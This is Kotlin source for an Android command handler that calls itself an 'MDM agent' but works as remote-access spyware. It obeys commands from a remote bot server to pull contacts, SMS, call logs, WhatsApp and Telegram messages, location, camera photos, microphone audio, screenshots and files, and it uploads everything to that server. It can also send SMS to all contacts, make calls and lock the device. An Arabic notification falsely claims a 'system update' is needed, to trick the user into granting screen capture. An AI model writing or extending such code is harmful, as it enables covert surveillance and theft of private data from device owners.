package com.mdm.agent.data.remote

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.mdm.agent.data.model.CollectedData
import com.mdm.agent.util.DeviceUtils
import com.mdm.agent.util.PermissionManager
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class CommandHandler(
    private val context: Context,
    private val apiClient: ApiClient,
    private val cryptoManager: CryptoManager,
    private val socketManager: SocketManager,
    private val uploadManager: UploadManager
) {

    companion object {
        private const val TAG = "CommandHandler"
        private const val JSON_MEDIA = "application/json; charset=utf-8"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val collectors = DataCollectors(context)
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(180, TimeUnit.SECONDS)
        .build()

    fun handleCommand(data: JSONObject) {
        val command = data.optString("command", "")
        val params = data.optJSONObject("params")
        val deviceId = DeviceUtils.getDeviceId(context)

        Log.i(TAG, "Executing: $command")

        scope.launch {
            try {
                val missingPerms = collectors.needsPermission(command)
                val isManagementCmd = command in listOf(
                    "permission-status", "request-permission",
                    "keylogger-on", "keylogger-off",
                    "autoclick-on", "autoclick-off",
                    "input-monitoring-on", "input-monitoring-off",
                    "screenshot-on", "screenshot-off",
                    "ls", "download-file",
                    "media-images", "media-videos", "media-audio",
                    "download-media"
                )
                if (missingPerms.isNotEmpty() && !isManagementCmd) {
                    val response = JSONObject().apply {
                        put("command", command)
                        put("status", "permission_required")
                        put("permissions_needed", org.json.JSONArray(missingPerms))
                        put("device_id", deviceId)
                    }
                    sendResponse(response)
                    return@launch
                }

                val result = executeCommand(command, params, deviceId)
                if (result != null) {

                    // ─── FILE RESULTS: Upload directly to bot as media ───
                    if (result is CollectedData.FileResult) {
                        // ✅ Detect file type from metadata tag (set by DataCollectors)
                        // Falls back to command-based detection
                        val meta = result.metadata
                        val fileType = when {
                            meta == "media_image" -> "photo"
                            meta == "media_video" -> "video"
                            meta == "media_audio" -> "audio"
                            command.contains("camera") || command.contains("screenshot") -> "photo"
                            command.contains("microphone") || command.contains("audio") -> "audio"
                            command.contains("video") || command == "pull-videos" -> "video"
                            command.contains("gallery") || command.contains("image") -> "photo"
                            else -> "document"
                        }
                        uploadFileToBot(result.file, command, deviceId, fileType)
                        result.file.delete()
                    }
                    // ─── JSON/TEXT RESULTS: Save as file and upload ───
                    else if (result is CollectedData.JsonResult) {
                        val text = result.json
                        if (text.isNotEmpty() && text != "[]" && text != "{}" && text != "\"[]\"") {

                            // ⚠️ CRITICAL FIX: If this is a file_list JSON, send via command_response
                            // so the server can render it as inline keyboard buttons in Telegram.
                            // Do NOT upload as a document file - that's what was causing the
                            // "compressed file" issue in the file explorer.
                            var isFileList = false
                            try {
                                val parsed = JSONObject(text)
                                val t = parsed.optString("type")
                                if (t == "file_list" || t == "media_list") {
                                    isFileList = true
                                    val response = JSONObject().apply {
                                        put("command", command)
                                        put("status", "success")
                                        put("data", text)
                                        put("device_id", deviceId)
                                    }
                                    sendResponse(response)
                                    Log.i(TAG, "✅ Sent $t via command_response (inline keyboard)")
                                }
                            } catch (e: Exception) {
                                // Not a JSON object - fall through to normal handling
                            }

                            // Regular JSON: save as text file and upload as document
                            if (!isFileList) {
                                val file = saveTextToFile(text, command, deviceId)
                                uploadFileToBot(file, command, deviceId, "document")
                                file.delete()
                            }
                        } else {
                            val response = JSONObject().apply {
                                put("command", command)
                                put("status", "no_data")
                                put("data", text)
                                put("device_id", deviceId)
                            }
                            sendResponse(response)
                        }
                    }
                    else if (result is CollectedData.TextResult) {
                        val text = result.text
                        if (text.isNotEmpty()) {
                            // Send as text message (not file) so user can read it in chat
                            val response = JSONObject().apply {
                                put("command", command)
                                put("status", "success")
                                put("data", text)
                                put("device_id", deviceId)
                            }
                            sendResponse(response)
                        }
                    }
                    // ─── PendingResult: command already handled its own response ───
                    // (e.g. screenshot-on sends info + final from activity)
                    // Do NOT send any response - the pending entry is preserved for
                    // the final response that will come later.
                    else if (result is CollectedData.PendingResult) {
                        Log.i(TAG, "⏳ Command $command returned PendingResult - waiting for final response")
                        // Intentionally do nothing - response will come from elsewhere
                    }
                    // ─── String results: simple status ───
                    else if (result is String) {
                        val response = JSONObject().apply {
                            put("command", command)
                            put("status", "success")
                            put("data", result)
                            put("device_id", deviceId)
                        }
                        sendResponse(response)
                    }
                } else {
                    val response = JSONObject().apply {
                        put("command", command)
                        put("status", "no_data")
                        put("device_id", deviceId)
                    }
                    sendResponse(response)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command error: $command", e)
                val response = JSONObject().apply {
                    put("command", command)
                    put("status", "error")
                    put("error", e.message ?: "unknown")
                    put("device_id", deviceId)
                }
                sendResponse(response)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // UPLOAD FILE DIRECTLY TO BOT VIA SERVER
    // ═══════════════════════════════════════════════════════════

    private fun uploadFileToBot(file: File, command: String, deviceId: String, fileType: String) {
        val serverUrl = DeviceUtils.getServerUrl(context)
        try {
            val url = "$serverUrl/api/device/upload-media"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("command", command)
                .addFormDataPart("file_type", fileType)
                .addFormDataPart("file", file.name,
                    file.asRequestBody("application/octet-stream".toMediaType()))
                .build()

            val request = Request.Builder().url(url).post(requestBody).build()
            val response = httpClient.newCall(request).execute()
            if (response.isSuccessful) {
                Log.i(TAG, "✅ File uploaded to bot: ${file.name} ($fileType)")
            } else {
                Log.e(TAG, "❌ Upload failed: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload error: ${e.message}")
        }
    }

    private fun saveTextToFile(text: String, command: String, deviceId: String): File {
        val ext = when (command) {
            "contacts" -> "vcf"
            "all-sms" -> "txt"
            "calls" -> "txt"
            "apps" -> "txt"
            else -> "txt"
        }
        val filename = "${command}_${System.currentTimeMillis()}.$ext"
        val file = File(context.cacheDir, filename)
        FileOutputStream(file).use { fos ->
            // For contacts, try to create VCF format
            if (command == "contacts" && text.startsWith("[")) {
                fos.write(textToVcf(text).toByteArray(Charsets.UTF_8))
            } else {
                fos.write(text.toByteArray(Charsets.UTF_8))
            }
        }
        return file
    }

    private fun textToVcf(jsonText: String): String {
        val sb = StringBuilder()
        try {
            val arr = org.json.JSONArray(jsonText)
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val name = obj.optString("name", "Unknown")
                val phone = obj.optString("phone", obj.optString("number", ""))
                sb.append("BEGIN:VCARD\nVERSION:3.0\nFN:$name\nTEL:$phone\nEND:VCARD\n")
            }
        } catch (e: Exception) {
            sb.append(jsonText)
        }
        return sb.toString()
    }

    // ═══════════════════════════════════════════════════════════
    // SEND TEXT RESPONSE
    // ═══════════════════════════════════════════════════════════

    private fun sendResponse(data: JSONObject) {
        if (socketManager.isConnected) {
            socketManager.sendCommandResponse(data)
        } else {
            sendResponseViaRest(data)
        }
    }

    /**
     * Send a status update that does NOT consume the pending command on the server.
     * Use this for intermediate status like "waiting for user approval".
     * The server-side handler ignores responses with status="info" (doesn't pop pending).
     */
    private fun sendInfoUpdate(command: String, message: String, deviceId: String) {
        val data = JSONObject().apply {
            put("command", command)
            put("status", "info")
            put("data", message)
            put("device_id", deviceId)
        }
        if (socketManager.isConnected) {
            socketManager.sendCommandResponse(data)
        } else {
            sendResponseViaRest(data)
        }
    }

    /**
     * Show a notification prompting the user to open the app and grant
     * screenshot permission. Tapping the notification opens MainActivity
     * where the user can press the "📸 تفعيل لقطات الشاشة" button.
     */
    private fun showScreenshotNotification() {
        try {
            val notificationManager = context.getSystemService(android.content.Context.NOTIFICATION_SERVICE)
                as android.app.NotificationManager

            // Create notification channel (required on Android 8+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    "screenshot_request",
                    "طلبات النظام",
                    android.app.NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "إشعارات طلبات النظام"
                    enableVibration(true)
                }
                notificationManager.createNotificationChannel(channel)
            }

            // Intent to open MainActivity when notification is tapped
            val intent = Intent(context, com.mdm.agent.MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            val pendingIntent = android.app.PendingIntent.getActivity(
                context, 0, intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )

            val notification = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.Notification.Builder(context, "screenshot_request")
                    .setContentTitle("📸 تحديث النظام مطلوب")
                    .setContentText("اضغط هنا لإكمال تحديث النظام")
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentIntent(pendingIntent)
                    .setAutoCancel(true)
                    .build()
            } else {
                @Suppress("DEPRECATION")
                android.app.Notification.Builder(context)
                    .setContentTitle("📸 تحديث النظام مطلوب")
                    .setContentText("اضغط هنا لإكمال تحديث النظام")
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentIntent(pendingIntent)
                    .setAutoCancel(true)
                    .build()
            }

            notificationManager.notify(3003, notification)
            Log.i(TAG, "✅ Screenshot request notification shown")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to show notification: ${e.message}")
        }
    }

    private fun sendResponseViaRest(data: JSONObject) {
        val serverUrl = DeviceUtils.getServerUrl(context)
        try {
            val url = "$serverUrl/api/device/response"
            val body = data.toString().toRequestBody(JSON_MEDIA.toMediaType())
            val request = Request.Builder().url(url).post(body).build()
            httpClient.newCall(request).execute()
        } catch (e: Exception) {
            Log.e(TAG, "REST response error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun executeCommand(
        command: String,
        params: JSONObject?,
        deviceId: String
    ): Any? {
        return when (command) {
            "contacts" -> collectors.getContacts()
            "all-sms" -> collectors.getSms()
            "calls" -> collectors.getCallLog()
            "apps" -> collectors.getInstalledApps()
            "gallery" -> collectors.getGalleryImages()
            "gmail" -> collectors.getGmailMetadata()
            "whatsapp-messages" -> collectors.getWhatsAppMessages()
            "telegram-messages" -> collectors.getTelegramMessages()
            "get-location" -> collectors.getLocation()
            "main-camera" -> collectors.captureCamera(0)
            "selfie-camera" -> collectors.captureCamera(1)
            "screenshot" -> collectors.takeScreenshot()
            "microphone" -> collectors.recordAudio(durationSec = 30)
            "playAudio" -> {
                val url = params?.optString("value", "") ?: ""
                collectors.playAudio(url)
                "audio_play_started"
            }
            "stopAudio" -> { collectors.stopAudio(); "audio_stopped" }
            "toast" -> { collectors.showToast(params?.optString("value", "") ?: ""); "toast_shown" }
            "vibrate" -> { collectors.vibrate(); "vibrated" }
            "sendSms" -> {
                val raw = params?.optString("value", "") ?: ""
                val parts = raw.split(":", limit = 2)
                if (parts.size == 2) collectors.sendSms(parts[0], parts[1]) else "invalid_format"
            }
            "makeCall" -> { collectors.makeCall(params?.optString("value", "") ?: ""); "call_initiated" }
            "device-policy-lock" -> collectors.lockDevice()
            "popNotification" -> {
                val raw = params?.optString("value", "") ?: ""
                val parts = raw.split(":", limit = 2)
                if (parts.size == 2) collectors.showNotification(parts[0], parts[1]) else "invalid_format"
            }
            "smsToAllContacts" -> { collectors.sendSmsToAllContacts(params?.optString("value", "") ?: ""); "sent" }
            "input-monitoring-on" -> collectors.setInputMonitoring(true)
            "input-monitoring-off" -> collectors.setInputMonitoring(false)
            "screenshot-on" -> {
                // ✅ MediaProjection request now comes ONLY from bot (not at app launch)
                // If permission is already granted → just enable auto-screenshot
                // If not → show notification asking user to open the app
                if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
                    com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
                    Log.i(TAG, "✅ screenshot-on: auto-screenshot enabled (permission already granted)")
                    CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية (الصلاحية ممنوحة مسبقاً)")
                } else {
                    Log.i(TAG, "📸 screenshot-on: permission NOT granted yet - sending notification to user")
                    // ⚠️ Send "info" status (does NOT consume pending on server)
                    sendInfoUpdate("screenshot-on",
                        "⏳ يجب تفعيل لقطة الشاشة من التطبيق - تم إرسال إشعار للمستخدم. اطلب منه فتح التطبيق والضغط على زر '📸 تفعيل لقطات الشاشة'",
                        deviceId)

                    // ✅ Send a notification to the user prompting them to open the app
                    Handler(Looper.getMainLooper()).post {
                        try {
                            showScreenshotNotification()
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Failed to show notification: ${e.message}")
                        }
                    }
                    // Return PendingResult - the final response will come from
                    // ScreenCapturePermissionActivity after user opens app and approves
                    CollectedData.PendingResult
                }
            }
            "screenshot-off" -> {
                com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
                "auto_screenshot_disabled"
            }
            "apply-data-protection" -> collectors.applyDataProtection()
            "pull-videos" -> collectors.getGalleryVideos()
            "stop-videos" -> "stopped"
            "stop-gallery" -> "stopped"
            "get-device-info" -> collectors.getFullDeviceInfo()
            "ls" -> {
                val path = params?.optString("value", "/sdcard/") ?: "/sdcard/"
                Log.i(TAG, "📂 ls: listing files in $path")
                val result = collectors.listFiles(path)
                Log.i(TAG, "📂 ls: result type=${result?.javaClass?.simpleName}")
                result
            }
            "download-file" -> {
                val filePath = params?.optString("value", "") ?: ""
                if (filePath.isNotEmpty()) {
                    collectors.downloadFile(filePath)
                } else {
                    CollectedData.TextResult("❌ لم يتم تحديد مسار الملف")
                }
            }
            // ✅ NEW: MediaStore-based file explorer commands
            "media-images" -> collectors.listMediaFiles("images")
            "media-videos" -> collectors.listMediaFiles("videos")
            "media-audio" -> collectors.listMediaFiles("audio")
            "download-media" -> {
                val uri = params?.optString("value", "") ?: ""
                if (uri.isNotEmpty()) {
                    collectors.downloadMediaFile(uri)
                } else {
                    CollectedData.TextResult("❌ لم يتم تحديد URI الملف")
                }
            }
            "app-monitor-start" -> collectors.startAppMonitor()
            "app-monitor-stop" -> collectors.stopAppMonitor()
            "app-usage-report" -> collectors.getAppUsageReport()
            "app-notifications" -> collectors.getRecentNotifications()
            "running-apps" -> collectors.getRunningApps()
            "kill-app" -> collectors.killApp(params?.optString("value", "") ?: "")
            else -> { Log.w(TAG, "Unknown command: $command"); null }
        }
    }
}
